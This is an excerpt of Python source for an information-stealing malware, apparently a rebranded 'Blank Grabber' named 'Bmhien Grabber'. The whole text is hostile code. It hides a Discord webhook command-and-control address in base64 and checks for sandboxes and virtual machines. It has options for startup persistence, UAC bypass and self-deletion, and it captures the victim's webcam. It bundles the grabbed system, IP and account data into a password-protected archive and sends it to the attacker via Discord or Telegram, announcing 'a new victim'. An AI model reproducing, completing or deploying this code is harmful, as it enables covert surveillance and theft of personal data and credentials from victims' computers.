...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExNjc1OTY4NDY0NTQwNDgwNS9ENnBiNXk3Y0lDWEgtV3ZKTW1lVkRlM3MtRDRLWTJ1WFZYemtSSzlZVmNpR3FBTmJrczRjY2szamo5bHRSTWpUSHBMUw==').decode())
    Mutex = base64.b64decode('V2R1SnRxY3gxaDFmQlVOMQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('Ym1oaWVu').decode()
...
class VmProtect:
    ...
    def checkHTTPSimulation() -> bool:
        ...
        try:
            http.request('GET', f'https://bmhien-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True
...
class Syscalls:
    ...
    def CaptureWebcam(index: int, filePath: str) -> bool:
        ...
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Bmhien'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
...
class BlankGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'bmhien'
    ...
    def SendData(self) -> None:
        ...
        filename = 'Bmhien-%s.%s' % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://bmhien.pages.dev/src/img/avt.jpg'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Bmhien Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Bmhien Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>Bmhien Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
